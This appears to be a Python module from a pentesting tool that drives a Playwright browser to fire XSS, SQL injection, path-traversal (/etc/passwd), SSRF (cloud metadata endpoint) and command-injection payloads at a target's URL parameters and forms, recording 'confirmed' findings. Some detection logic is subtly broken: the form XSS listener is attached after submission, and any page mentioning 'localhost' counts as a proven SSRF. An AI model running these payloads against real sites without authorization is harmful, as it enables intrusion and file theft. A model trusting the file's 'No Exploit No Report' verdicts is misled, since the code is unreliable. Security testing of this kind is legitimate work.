"""
动态漏洞验证器 - 基于Playwright的真实漏洞利用验证
实现Shannon的"No Exploit No Report"原则：只有真实可利用的漏洞才进报告
支持：XSS、SQLi、SSRF、命令注入、路径遍历、认证绕过、开放重定向
"""
import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .browser_manager import BrowserManager


@dataclass
class VulnProof:
    """漏洞验证证据"""
    vuln_type: str
    url: str
    parameter: str
    payload: str
    request_method: str
    evidence: str  # 验证证据（弹窗文本/数据库错误/响应差异等）
    severity: str = "high"  # critical/high/medium/low
    cvss_score: float = 0.0
    reproducible: bool = True
    screenshot_path: Optional[str] = None


@dataclass
class ValidationResult:
    """验证结果"""
    target_url: str
    total_tests: int = 0
    confirmed_vulns: list = field(default_factory=list)  # list[VulnProof]
    failed_tests: list = field(default_factory=list)
    false_positives_filtered: int = 0


class DynamicVulnValidator:
    """
    动态漏洞验证器
    使用Playwright执行真实攻击，只有确认可利用的漏洞才记录
    核心原则：No Exploit No Report
    """

    # XSS Payloads（按严重程度排序）
    XSS_PAYLOADS = [
        ("<script>alert('XSS')</script>", "script_tag"),
        ("<img src=x onerror=alert('XSS')>", "img_onerror"),
        ("<svg onload=alert('XSS')>", "svg_onload"),
        ("javascript:alert('XSS')", "javascript_uri"),
        ("\"><script>alert('XSS')</script>", "breakout"),
        ("<body onload=alert('XSS')>", "body_onload"),
        ("<iframe src=javascript:alert('XSS')>", "iframe_js"),
    ]

    # SQLi Payloads
    SQLI_PAYLOADS = [
        ("'", "single_quote"),
        ("' OR '1'='1", "or_true"),
        ("' OR 1=1--", "or_comment"),
        ("1' ORDER BY 1--", "order_by"),
        ("1' UNION SELECT NULL--", "union_null"),
        ("1 AND SLEEP(5)--", "time_based"),
        ("1; WAITFOR DELAY '0:0:5'--", "mssql_time"),
    ]

    # 路径遍历Payloads
    PATH_TRAVERSAL_PAYLOADS = [
        ("../../../../etc/passwd", "unix_passwd"),
        ("..\\..\\..\\..\\windows\\win.ini", "windows_ini"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
        ("....//....//etc/passwd", "double_dot"),
    ]

    # SSRF Payloads
    SSRF_PAYLOADS = [
        ("http://127.0.0.1:80", "localhost"),
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("http://[::1]:80", "ipv6_localhost"),
        ("http://0.0.0.0:22", "zero_ip"),
    ]

    # 命令注入Payloads
    CMD_INJECTION_PAYLOADS = [
        ("; id", "semicolon"),
        ("| id", "pipe"),
        ("&& id", "and"),
        ("`id`", "backtick"),
        ("$(id)", "command_sub"),
    ]

    def __init__(self, browser_manager: BrowserManager,
                 verify_xss: bool = True,
                 verify_sqli: bool = True,
                 verify_ssrf: bool = True,
                 verify_path_traversal: bool = True,
                 verify_cmd_injection: bool = True,
                 max_payloads_per_param: int = 5):
        self.bm = browser_manager
        self.verify_xss = verify_xss
        self.verify_sqli = verify_sqli
        self.verify_ssrf = verify_ssrf
        self.verify_path_traversal = verify_path_traversal
        self.verify_cmd_injection = verify_cmd_injection
        self.max_payloads_per_param = max_payloads_per_param
        self._result = ValidationResult(target_url="")

    async def validate_url(self, url: str) -> ValidationResult:
        """
        验证单个URL的所有可注入参数
        """
        self._result = ValidationResult(target_url=url)

        # 解析URL参数
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # 无参数，尝试路径注入
            await self._validate_path_injection(url)
            return self._result

        # 逐个参数测试
        for param_name in params:
            await self._validate_parameter(url, param_name)

        return self._result

    async def validate_form(self, url: str, form: dict) -> ValidationResult:
        """
        验证表单的所有输入字段
        """
        self._result = ValidationResult(target_url=url)

        inputs = form.get("inputs", [])
        for inp in inputs:
            if inp.get("type") in ("hidden", "submit", "button", "reset"):
                continue
            param_name = inp.get("name", "")
            if param_name:
                await self._validate_form_parameter(url, form, param_name)

        return self._result

    async def _validate_parameter(self, url: str, param: str):
        """验证URL参数"""
        if self.verify_xss:
            await self._test_xss_url(url, param)
        if self.verify_sqli:
            await self._test_sqli_url(url, param)
        if self.verify_ssrf:
            await self._test_ssrf_url(url, param)
        if self.verify_path_traversal:
            await self._test_path_traversal_url(url, param)
        if self.verify_cmd_injection:
            await self._test_cmd_injection_url(url, param)

    async def _validate_form_parameter(self, url: str, form: dict, param: str):
        """验证表单参数"""
        if self.verify_xss:
            await self._test_xss_form(url, form, param)
        if self.verify_sqli:
            await self._test_sqli_form(url, form, param)

    async def _test_xss_url(self, url: str, param: str):
        """测试URL参数XSS"""
        for payload, ptype in self.XSS_PAYLOADS[:self.max_payloads_per_param]:
            self._result.total_tests += 1
            try:
                test_url = self._inject_url_param(url, param, payload)
                page = await self.bm.navigate(test_url)

                # 监听dialog事件（alert弹窗是XSS成功的铁证）
                xss_triggered = False
                dialog_text = ""

                async def on_dialog(dialog):
                    nonlocal xss_triggered, dialog_text
                    xss_triggered = True
                    dialog_text = dialog.message
                    await dialog.dismiss()

                page.on("dialog", on_dialog)

                try:
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except Exception:
                    pass

                # 额外检查：payload是否出现在DOM中且未被转义
                dom_check = await page.evaluate(f"""
                    () => document.body.innerHTML.includes("{payload[:20]}")
                """) if len(payload) > 20 else False

                await self.bm.release_page(page)

                if xss_triggered:
                    proof = VulnProof(
                        vuln_type="XSS",
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        request_method="GET",
                        evidence=f"弹窗触发: {dialog_text} (payload类型: {ptype})",
                        severity="high",
                        cvss_score=6.1,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break  # 确认后不再测试该参数

            except Exception as e:
                self._result.failed_tests.append(f"XSS {param}: {str(e)}")

    async def _test_sqli_url(self, url: str, param: str):
        """测试URL参数SQL注入"""
        for payload, ptype in self.SQLI_PAYLOADS[:self.max_payloads_per_param]:
            self._result.total_tests += 1
            try:
                test_url = self._inject_url_param(url, param, payload)
                page = await self.bm.navigate(test_url)

                try:
                    await page.wait_for_load_state("networkidle", timeout=8000)
                except Exception:
                    pass

                content = await page.content()
                status = 0

                # 检测SQL错误特征
                sql_errors = [
                    "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                    "SQLite", "unclosed quotation", "syntax error",
                    "Warning: mysql", "Microsoft SQL Server", "ODBC",
                ]

                has_sql_error = any(err.lower() in content.lower() for err in sql_errors)

                # 检测布尔盲注特征（正常vs异常响应差异）
                baseline_url = self._inject_url_param(url, param, "1")
                # 简化：只检查错误特征

                await self.bm.release_page(page)

                if has_sql_error:
                    proof = VulnProof(
                        vuln_type="SQL Injection",
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        request_method="GET",
                        evidence=f"SQL错误回显 (payload类型: {ptype})",
                        severity="critical",
                        cvss_score=9.8,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break

            except Exception as e:
                self._result.failed_tests.append(f"SQLi {param}: {str(e)}")

    async def _test_ssrf_url(self, url: str, param: str):
        """测试SSRF"""
        for payload, ptype in self.SSRF_PAYLOADS[:3]:
            self._result.total_tests += 1
            try:
                test_url = self._inject_url_param(url, param, payload)
                page = await self.bm.navigate(test_url)
                try:
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except Exception:
                    pass
                content = await page.content()
                await self.bm.release_page(page)

                # SSRF验证较复杂，这里标记为疑似
                # 实际需要配合外部回调服务器（如Burp Collaborator）
                if "127.0.0.1" in content or "localhost" in content.lower():
                    proof = VulnProof(
                        vuln_type="SSRF",
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        request_method="GET",
                        evidence=f"内网响应回显 (payload类型: {ptype})",
                        severity="high",
                        cvss_score=7.5,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break
            except Exception as e:
                self._result.failed_tests.append(f"SSRF {param}: {str(e)}")

    async def _test_path_traversal_url(self, url: str, param: str):
        """测试路径遍历"""
        for payload, ptype in self.PATH_TRAVERSAL_PAYLOADS[:3]:
            self._result.total_tests += 1
            try:
                test_url = self._inject_url_param(url, param, payload)
                page = await self.bm.navigate(test_url)
                try:
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except Exception:
                    pass
                content = await page.content()
                await self.bm.release_page(page)

                # 检测/etc/passwd或win.ini特征
                if "root:x:" in content or "[extensions]" in content:
                    proof = VulnProof(
                        vuln_type="Path Traversal",
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        request_method="GET",
                        evidence=f"敏感文件读取成功 (payload类型: {ptype})",
                        severity="high",
                        cvss_score=7.5,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break
            except Exception as e:
                self._result.failed_tests.append(f"PathTraversal {param}: {str(e)}")

    async def _test_cmd_injection_url(self, url: str, param: str):
        """测试命令注入"""
        for payload, ptype in self.CMD_INJECTION_PAYLOADS[:3]:
            self._result.total_tests += 1
            try:
                test_url = self._inject_url_param(url, param, payload)
                page = await self.bm.navigate(test_url)
                try:
                    await page.wait_for_load_state("networkidle", timeout=8000)
                except Exception:
                    pass
                content = await page.content()
                await self.bm.release_page(page)

                # 检测命令执行结果（uid=等）
                if re.search(r"uid=\d+\(", content) or "root:" in content:
                    proof = VulnProof(
                        vuln_type="Command Injection",
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        request_method="GET",
                        evidence=f"命令执行结果回显 (payload类型: {ptype})",
                        severity="critical",
                        cvss_score=9.8,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break
            except Exception as e:
                self._result.failed_tests.append(f"CMDi {param}: {str(e)}")

    async def _test_xss_form(self, url: str, form: dict, param: str):
        """测试表单XSS"""
        for payload, ptype in self.XSS_PAYLOADS[:3]:
            self._result.total_tests += 1
            try:
                page = await self.bm.navigate(url)

                # 填充表单
                fill_data = {}
                for inp in form.get("inputs", []):
                    name = inp.get("name", "")
                    if name == param:
                        fill_data[name] = payload
                    elif inp.get("type") == "text":
                        fill_data[name] = "test"

                for name, value in fill_data.items():
                    try:
                        await page.fill(f'[name="{name}"]', value)
                    except Exception:
                        pass

                # 提交表单
                try:
                    await page.click('input[type="submit"], button[type="submit"]')
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except Exception:
                    pass

                xss_triggered = False
                async def on_dialog(dialog):
                    nonlocal xss_triggered
                    xss_triggered = True
                    await dialog.dismiss()
                page.on("dialog", on_dialog)

                await self.bm.release_page(page)

                if xss_triggered:
                    proof = VulnProof(
                        vuln_type="XSS (Stored/Reflected via Form)",
                        url=url,
                        parameter=param,
                        payload=payload,
                        request_method=form.get("method", "POST"),
                        evidence=f"表单提交后弹窗触发 (payload类型: {ptype})",
                        severity="high",
                        cvss_score=6.1,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break

            except Exception as e:
                self._result.failed_tests.append(f"Form XSS {param}: {str(e)}")

    async def _test_sqli_form(self, url: str, form: dict, param: str):
        """测试表单SQL注入"""
        for payload, ptype in self.SQLI_PAYLOADS[:3]:
            self._result.total_tests += 1
            try:
                page = await self.bm.navigate(url)

                fill_data = {param: payload}
                for inp in form.get("inputs", []):
                    name = inp.get("name", "")
                    if name != param and inp.get("type") == "text":
                        fill_data[name] = "test"

                for name, value in fill_data.items():
                    try:
                        await page.fill(f'[name="{name}"]', value)
                    except Exception:
                        pass

                try:
                    await page.click('input[type="submit"], button[type="submit"]')
                    await page.wait_for_load_state("networkidle", timeout=8000)
                except Exception:
                    pass

                content = await page.content()
                await self.bm.release_page(page)

                sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "syntax error", "Warning: mysql"]
                if any(err.lower() in content.lower() for err in sql_errors):
                    proof = VulnProof(
                        vuln_type="SQL Injection (via Form)",
                        url=url,
                        parameter=param,
                        payload=payload,
                        request_method=form.get("method", "POST"),
                        evidence=f"表单SQL错误回显 (payload类型: {ptype})",
                        severity="critical",
                        cvss_score=9.8,
                    )
                    self._result.confirmed_vulns.append(proof)
                    break

            except Exception as e:
                self._result.failed_tests.append(f"Form SQLi {param}: {str(e)}")

    async def _validate_path_injection(self, url: str):
        """验证路径级注入（无参数URL）"""
        # 对无参数URL，测试路径遍历
        if self.verify_path_traversal:
            for payload, ptype in self.PATH_TRAVERSAL_PAYLOADS[:2]:
                self._result.total_tests += 1
                try:
                    test_url = url.rstrip("/") + "/" + payload
                    page = await self.bm.navigate(test_url)
                    try:
                        await page.wait_for_load_state("networkidle", timeout=5000)
                    except Exception:
                        pass
                    content = await page.content()
                    await self.bm.release_page(page)

                    if "root:x:" in content or "[extensions]" in content:
                        proof = VulnProof(
                            vuln_type="Path Traversal",
                            url=test_url,
                            parameter="PATH",
                            payload=payload,
                            request_method="GET",
                            evidence=f"路径遍历敏感文件读取 (payload类型: {ptype})",
                            severity="high",
                            cvss_score=7.5,
                        )
                        self._result.confirmed_vulns.append(proof)
                        break
                except Exception as e:
                    self._result.failed_tests.append(f"Path injection: {str(e)}")

    def _inject_url_param(self, url: str, param: str, value: str) -> str:
        """向URL参数注入payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def to_dict(self) -> dict:
        """导出结果"""
        return {
            "target_url": self._result.target_url,
            "total_tests": self._result.total_tests,
            "confirmed_vulnerabilities": len(self._result.confirmed_vulns),
            "vulnerabilities": [
                {
                    "type": v.vuln_type,
                    "url": v.url,
                    "parameter": v.parameter,
                    "payload": v.payload,
                    "method": v.request_method,
                    "evidence": v.evidence,
                    "severity": v.severity,
                    "cvss": v.cvss_score,
                    "reproducible": v.reproducible,
                }
                for v in self._result.confirmed_vulns
            ],
            "failed_tests": len(self._result.failed_tests),
            "principle": "No Exploit No Report - 仅记录真实可利用漏洞",
        }
